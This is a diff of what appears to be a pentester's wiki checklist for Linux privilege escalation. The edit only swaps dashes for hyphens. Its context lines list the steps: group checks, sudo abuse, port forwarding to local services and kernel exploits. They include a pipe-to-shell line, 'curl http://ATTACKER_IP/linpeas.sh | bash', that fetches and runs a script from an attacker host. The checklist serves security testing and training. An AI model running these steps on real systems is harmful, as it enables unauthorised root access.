@@ -1,4 +1,4 @@
-# Linux Privilege Escalation — Master Checklist
+# Linux Privilege Escalation - Master Checklist
 
 Run in order. Stop when you get root.
 
@@ -7,7 +7,7 @@ Run in order. Stop when you get root.
 id && whoami
 hostname
 ```
-Check groups — `docker`, `lxd`, `adm`, `disk` are gold. See [[Docker-LXD]].
+Check groups - `docker`, `lxd`, `adm`, `disk` are gold. See [[Docker-LXD]].
 
 ## 2. Sudo
 ```bash
@@ -17,7 +17,7 @@ Any NOPASSWD entries? Any `env_keep` with LD_PRELOAD? See [[Sudo-Abuse]].
 
 ## 3. Automated Enumeration
 ```bash
-# LinPEAS — upload and run
+# LinPEAS - upload and run
 curl http://ATTACKER_IP/linpeas.sh | bash
 
 # Or transfer manually
@@ -58,7 +58,7 @@ See [[Writable-Services]].
 ss -tlnp
 netstat -tlnp
 ```
-Anything on 127.0.0.1 only? MySQL, Redis, custom apps — port forward and attack.
+Anything on 127.0.0.1 only? MySQL, Redis, custom apps - port forward and attack.
 
 ## 9. Interesting Files
 ```bash
@@ -73,7 +73,7 @@ find / -name "*.db" -o -name "*.sqlite" 2>/dev/null | grep -v proc
 uname -a
 cat /etc/os-release
 ```
-See [[Kernel-Exploits]] — **last resort**, can crash the box.
+See [[Kernel-Exploits]] - **last resort**, can crash the box.
 
 ## 11. Docker / LXD Group
 ```bash
